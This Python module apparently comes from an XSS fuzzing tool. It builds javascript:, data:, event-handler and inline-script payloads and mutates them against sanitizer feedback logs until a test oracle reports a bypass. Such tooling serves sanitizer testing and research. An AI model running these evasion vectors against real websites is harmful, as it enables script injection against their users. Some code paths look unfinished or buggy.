from .evasion_model import hex_html_no_semicolon_encode, url_encode, unicode_encode, protocols_mutate, function_mutate, events_mutate, inline_mutate
from .config_model import functions, protocols, eventHandlers, greaterfilling, payloads, protocolsAttributes, fillings, unique_probe, feedback_log, xt_file ,script_starttag, script_endtag, lessfilling, feedback_dir
from .verify_model import Sanitizer_Tester
from .helper_model import htmlencode_mode, read_matched_substring, parse_xt_file,calculate_cosine_similarity, generate_tag, str_replace_params, parse_logs, extract_tags, chose_most_similar, input_similarity, get_matched_string
import random
from threading import Lock
import threading
from queue import Queue
log_lock = Lock()
tester = Sanitizer_Tester()

class SchemeTriggerCharacters:
    def __init__(self):
        self.dangerous_scheme = {
            'javascript:': ['alert(1)', 'prompt("XSS")', 'confirm("XSS")', 'alert(String.fromCharCode(88,83,83))'],
            'data:': ['text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K'] 
        }
    
    def url_attackgrammar(self, tester, context, test_put_path):
        tag = context['details']['tag']
        Type = context['details']['type']
        terminator = context['details']['quote']
        attribute_name = context['details']['name']
        attribute_value = context['details']['value']
        without = attribute_value.startswith(unique_probe)
        position = context['position']
        vectors = {1: set(), 2: set(), 3: set()}
        test_count = 0
        strip_flag = 0
        q = Queue()
        break_flag = 0
        pre_function_calls = {}
        if without: 
            for protocol in protocols:
                for function in functions:
                    vector = protocol + ':' + function
                    q.put(vector)
                    init_vector = vector
                    MAX_ITERATION = 3
                    iteration_count = 0
                    while not q.empty() and iteration_count < MAX_ITERATION:
                        test_count += 1
                        vector = q.get()
                        iteration_count += 1
                        if log_lock:
                            with log_lock:
                                if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                    return vector, test_count
                                feedback_message = parse_logs(feedback_dir, vector)
                        else:
                            if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                return vector, test_count
                            feedback_message = parse_logs(feedback_dir, vector)
                        if input_similarity(feedback_message, vector):
                            matched_substrings = get_matched_string(feedback_message)
                            protocol_similarity = 0
                            function_similarity = 0
                            protocol_matched_substring = None
                            function_matched_substring = None
                            for matched_substring in matched_substrings:
                                current_protocol_similarity = calculate_cosine_similarity(protocol, matched_substring)
                                if current_protocol_similarity > protocol_similarity:
                                    protocol_similarity = current_protocol_similarity
                                    protocol_matched_substring = matched_substring
                                
                                current_function_similarity = calculate_cosine_similarity(function, matched_substring)
                                if current_function_similarity > function_similarity:
                                    function_similarity = current_function_similarity
                                    function_matched_substring = matched_substring
                            new_vectors = set()
                            if protocol_similarity > 0.8:
                                new_vectors = protocols_mutate(vector, protocol_matched_substring)
                            elif function_similarity > 0.8:
                                new_vectors = function_mutate(vector,function_matched_substring)
                            else:
                                new_vectors = function_mutate(vector,function)
                                new_vectors.update(protocols_mutate(vector, protocol))

                            if new_vectors:
                                flag , vector, test_count = tester.bugoracle_select(test_put_path, new_vectors, position, init_vector, test_count, pre_function_calls)
                                if flag:
                                    return vector, test_count
                                q.put(vector)
                        if q.empty():
                            break

        else:
            for protocolsAttribute, tags in protocolsAttributes.items():
                for tag in tags:
                    if strip_flag and tag not in allow_tags:
                        continue
                    for protocol in protocols:
                        for function in functions:
                            for filling in fillings:
                                generated_tag = generate_tag(tag, {'id':'1',protocolsAttribute:protocol + ':' +function},{}, filling)
                                vector = terminator + greaterfilling + generated_tag[1] + lessfilling + terminator
                                q.put(vector)
                                init_vector = vector
                                MAX_ITERATION = 3
                                iteration_count = 0
                                while not q.empty() and iteration_count < MAX_ITERATION:
                                    test_count += 1
                                    vector = q.get()
                                    iteration_count += 1
                                    if log_lock:
                                        with log_lock:
                                            if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                                return vector, test_count
                                            feedback_message = parse_logs(feedback_dir, vector)
                                    else:
                                        if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                            return vector, test_count
                                        feedback_message = parse_logs(feedback_dir, vector)
                                    if htmlencode_mode(terminator, feedback_message) == False:
                                        return None, test_count
                                    if feedback_message['htmlencode.log']:
                                        break_flag = 1
                                        break
                                    if feedback_message['strip_tags.log']:
                                        for item in feedback_message['strip_tags.log']:
                                            if 'Allow Tags' in item:
                                                if isinstance(item['Allow Tags'], str):
                                                    allow_tags = extract_tags(item['Allow Tags'])
                                                    strip_flag = 1
                                            else:
                                                break_flag = 1
                                                break
                                    if input_similarity(feedback_message, vector):
                                        matched_substrings = get_matched_string(feedback_message)
                                        protocols_substring = generate_tag(tag, {'id':'1',protocolsAttribute:protocol + ':'},{}, filling)[1]
                                        protocols_similarity = 0
                                        function_similarity = 0
                                        protocols_matched_substring = None
                                        function_matched_substring = None
                                        for matched_substring in matched_substrings:
                                            current_protocols_similarity = calculate_cosine_similarity(protocols_substring, matched_substring)
                                            if current_protocols_similarity > protocols_similarity:
                                                protocols_similarity = current_protocols_similarity
                                                protocols_matched_substring = matched_substring
                                            
                                            current_function_similarity = calculate_cosine_similarity(function, matched_substring)
                                            if current_function_similarity > function_similarity:
                                                function_similarity = current_function_similarity
                                                function_matched_substring = matched_substring
                                        new_vectors = set()
                                        if protocols_similarity > 0.8:
                                            new_vectors = protocols_mutate(vector, protocols_matched_substring)
                                        elif function_similarity > 0.8:
                                            new_vectors = function_mutate(vector,function_matched_substring)
                                        
                                        if new_vectors:
                                            flag , vector, test_count = tester.bugoracle_select(test_put_path, new_vectors, position, init_vector, test_count, pre_function_calls)
                                            if flag:
                                                return vector, test_count
                                            q.put(vector)
                                    if q.empty():
                                        break
                                if break_flag:
                                    break
                            if break_flag:
                                break
                        if break_flag:
                            break
                    if break_flag:
                        break
                if break_flag:
                    break
        break_flag = 0
        for function in functions:
            for event, tags in eventHandlers.items():
                for event_tag in tags:
                    if tag == event_tag or event_tag == 'html':
                        for filling in fillings:
                            vector = terminator + filling + "id=1" + filling + 'name=snow1nd' + filling + event + '=' + function + '//' + terminator
                            q.put(vector)
                            init_vector = vector
                            while not q.empty():
                                test_count += 1
                                MAX_ITERATION = 3
                                iteration_count = 0
                                while iteration_count < MAX_ITERATION:
                                    vector = q.get()
                                    iteration_count += 1
                                    if log_lock:
                                        with log_lock:
                                            if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                                return vector, test_count
                                            feedback_message = parse_logs(feedback_dir, vector)
                                    else:
                                        if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                            return vector, test_count
                                        feedback_message = parse_logs(feedback_dir, vector)
                                    if htmlencode_mode(terminator, feedback_message) == False:
                                        return None, test_count
                                    if input_similarity(feedback_message, vector):
                                        matched_substrings = get_matched_string(feedback_message)
                                        event_similarity = 0
                                        function_similarity = 0
                                        event_matched_substring = None
                                        function_matched_substring = None
                                        for matched_substring in matched_substrings:
                                            current_event_similarity = calculate_cosine_similarity(event, matched_substring)
                                            if current_event_similarity > event_similarity:
                                                event_similarity = current_event_similarity
                                                event_matched_substring = matched_substring
                                            
                                            current_function_similarity = calculate_cosine_similarity(function, matched_substring)
                                            if current_function_similarity > function_similarity:
                                                function_similarity = current_function_similarity
                                                function_matched_substring = matched_substring
                                        new_vectors = set()
                                        if event_similarity > 0.8:
                                            new_vectors = events_mutate(vector, event_matched_substring)
                                        elif function_similarity > 0.8:
                                            new_vectors = function_mutate(vector,function_matched_substring)
                                        else:
                                            break

                                        if new_vectors:
                                            flag , vector, test_count = tester.bugoracle_select(test_put_path, new_vectors, position, init_vector, test_count, pre_function_calls)
                                            if flag:
                                                return vector, test_count
                                            q.put(vector)
                                    if q.empty():
                                        break
                    else:
                        if strip_flag and event_tag not in allow_tags:
                            continue
                        for filling in fillings:
                            generated_tag = generate_tag(event_tag,{"id":1},{event:function},filling)
                            vector = terminator + greaterfilling + generated_tag[1] + lessfilling + terminator
                            q.put(vector)
                            init_vector = vector
                            MAX_ITERATION = 3
                            iteration_count = 0
                            while not q.empty() and iteration_count < MAX_ITERATION:
                                test_count += 1
                                vector = q.get()
                                iteration_count += 1
                                if log_lock:
                                    with log_lock:
                                        if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                            return vector, test_count
                                        feedback_message = parse_logs(feedback_dir, vector)
                                else:
                                    if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                        return vector, test_count
                                    feedback_message = parse_logs(feedback_dir, vector)
                                if htmlencode_mode(terminator, feedback_message) == False:
                                    return None, test_count
                                if feedback_message['htmlencode.log']:
                                    break_flag = 1
                                    break
                                if feedback_message['strip_tags.log']:
                                    for item in feedback_message['strip_tags.log']:
                                        if 'Allow Tags' in item:
                                            if isinstance(item['Allow Tags'], str):
                                                allow_tags = extract_tags(item['Allow Tags'])
                                                strip_flag = 1
                                        else:
                                            break_flag = 1
                                            break
                                if input_similarity(feedback_message, vector):
                                    matched_substrings = get_matched_string(feedback_message)
                                    event_component = generate_tag(event_tag,{id:1},{event:''},filling)[1]
                                    event_similarity = 0
                                    function_similarity = 0
                                    event_matched_substring = None
                                    function_matched_substring = None
                                    for matched_substring in matched_substrings:
                                        current_event_similarity = calculate_cosine_similarity(event_component, matched_substring)
                                        if current_event_similarity > event_similarity:
                                            event_similarity = current_event_similarity
                                            event_matched_substring = matched_substring
                                        
                                        current_function_similarity = calculate_cosine_similarity(function, matched_substring)
                                        if current_function_similarity > function_similarity:
                                            function_similarity = current_function_similarity
                                            function_matched_substring = matched_substring
                                    new_vectors = set()
                                    if event_similarity > 0.8:
                                        new_vectors = events_mutate(vector, event_matched_substring)
                                    elif function_similarity > 0.8:
                                        new_vectors = function_mutate(vector,function_matched_substring)
                                    if new_vectors:
                                        flag , vector, test_count = tester.bugoracle_select(test_put_path, new_vectors, position, init_vector, test_count, pre_function_calls)
                                        if flag:
                                            return vector, test_count
                                        q.put(vector)
                                if q.empty():
                                    break
                            if break_flag:
                                break
        break_flag = 0
        for function in functions:
                vector = terminator + greaterfilling + script_starttag + function + script_endtag + lessfilling + terminator
                q.put(vector)
                init_vector = vector
                MAX_ITERATION = 3
                iteration_count = 0
                while not q.empty() and iteration_count < MAX_ITERATION:
                    test_count += 1
                    q.get()
                    iteration_count += 1
                    if log_lock:
                        with log_lock:
                            if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                                return vector, test_count
                    else:
                        if tester.bugoracle_pro(test_put_path, vector, position, init_vector):
                            return vector, test_count
                    pre_function_calls = parse_xt_file(feedback_dir)
                    feedback_message = parse_logs(feedback_dir, vector)
                    if htmlencode_mode(terminator, feedback_message) == False:
                        return None, test_count
                    if feedback_message['htmlencode.log']:
                        break_flag = 1
                        break
                    if feedback_message['strip_tags.log']:
                        for item in feedback_message['strip_tags.log']:
                            if 'Allow Tags' in item:
                                if isinstance(item['Allow Tags'], str):
                                    allow_tags = extract_tags(item['Allow Tags'])
                                    strip_flag = 1
                            else:
                                break_flag = 1
                                break
                    if input_similarity(feedback_message, vector):
                        matched_substrings = get_matched_string(feedback_message)
                        inline = script_starttag + script_endtag
                        inline_similarity = 0
                        function_similarity = 0
                        inline_matched_substring = None
                        function_matched_substring = None
                        for matched_substring in matched_substrings:
                            current_inline_similarity = calculate_cosine_similarity(inline, matched_substring)
                            if current_inline_similarity > inline_similarity:
                                inline_similarity = current_inline_similarity
                                inline_matched_substring = matched_substring
                            
                            current_function_similarity = calculate_cosine_similarity(function, matched_substring)
                            if current_function_similarity > function_similarity:
                                function_similarity = current_function_similarity
                                function_matched_substring = matched_substring
                        new_vectors = set()
                        if inline_similarity > 0.8:
                            new_vectors = inline_mutate(vector, inline_matched_substring)
                        elif function_similarity > 0.8:
                            new_vectors = function_mutate(vector,function_matched_substring)

                        if new_vectors:
                            flag , vector, test_count = tester.bugoracle_select(test_put_path, new_vectors, position, init_vector, test_count, pre_function_calls)
                            if flag:
                                return vector, test_count
                            q.put(vector)
                    if q.empty():
                        break
                if break_flag:
                    break
        return None, test_count
